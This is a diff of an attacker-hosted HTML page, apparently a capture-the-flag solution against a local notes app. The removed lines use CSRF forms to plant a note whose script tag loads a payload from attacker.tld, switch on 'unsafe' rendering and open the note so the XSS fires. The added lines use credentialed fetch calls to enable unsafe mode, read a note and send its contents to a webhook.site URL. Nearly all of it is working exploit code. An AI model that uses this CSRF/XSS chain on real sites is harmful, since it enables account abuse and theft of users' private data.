@@ -1,25 +1,32 @@
-<!-- save as attacker.html and host it on e.g. https://attacker.tld/pwn -->
-<!doctype html>
+
 <html>
-<body>
-<!-- 1. CSRF: make the bot create a malicious note -->
-<form id="n" action="http://127.0.0.1:7189/dashboard" method="POST">
-  <input type="hidden" name="content"
-  value='<script src="https://attacker.tld/payload.js"></script>'>
-</form>
-
-<!-- 2. CSRF: turn on “unsafe” rendering -->
-<form id="u" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
-  <input type="hidden" name="id" value="2"> <!-- our note’s id -->
-  <input type="hidden" name="enable" value="1">
-</form>
-
-<script>
-n.submit();               // create the XSS note   (#2)
-setTimeout(() => { u.submit(); }, 600);           // enable unsafe mode
-setTimeout(() => {
-  location = 'http://127.0.0.1:7189/notes/2';     // view it → XSS fires
-}, 1200);
-</script>
-</body>
+  <body>
+    <script>
+      // Step 1: Enable Unsafe Mode for the bot's note (id=1)
+      fetch('http://127.0.0.1:7189/prefs/unsafe', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: 'id=1&enable=1',
+        credentials: 'include'  // Include cookies (session)
+      })
+      .then(() => {
+        // Step 2: Fetch the note (now in unsafe mode)
+        fetch('http://127.0.0.1:7189/notes/1', {
+          credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(html => {
+          // Extract the flag from the note content
+          const parser = new DOMParser();
+          const doc = parser.parseFromString(html, 'text/html');
+          const noteContent = doc.querySelector('.note-content').textContent.trim();
+          
+          // Step 3: Exfiltrate the flag to your webhook
+          fetch('https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?flag=' + encodeURIComponent(noteContent));
+        });
+      });
+    </script>
+  </body>
 </html>
